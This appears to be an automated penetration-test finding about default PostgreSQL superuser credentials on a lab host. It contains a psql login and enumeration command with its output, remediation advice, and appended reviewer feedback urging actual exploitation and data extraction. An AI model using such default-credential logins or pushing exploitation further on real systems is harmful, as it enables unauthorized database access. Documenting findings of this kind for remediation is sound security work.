title: PostgreSQL Default Credentials (postgres:postgres)
description: PostgreSQL 8.3.1 is accessible remotely with default credentials (postgres:postgres). The postgres superuser has full administrative privileges. Database enumeration reveals 3 databases and at least one user table. This enables complete database compromise.
evidence:
Exploitation commands and output:
$ psql "host=192.168.0.140 user=postgres password=postgres sslmode=disable" -c "SELECT version();" -c "SELECT datname FROM pg_database;" -c "\dt"

version: PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)

Databases:
  template1
  template0
  postgres

Tables in postgres DB:
 Schema | Name  | Type  | Owner
 public | edott | table | postgres

Full superuser access confirmed. Can read/write all databases, enumerate schemas, and access all stored data.
remediation: Change the default PostgreSQL password immediately. Restrict remote access via pg_hba.conf. Bind to localhost if remote access is not needed. Audit all database contents for sensitive data.

issues: HIGH severity finding should have stronger evidence
Exploitation proof required for high/critical findings
suggestions: Add command output demonstrating access or data extraction
For high findings, demonstrate actual impact
Actually exploit the vulnerability and capture output
For SQLi: Show extracted data or UNION-based output
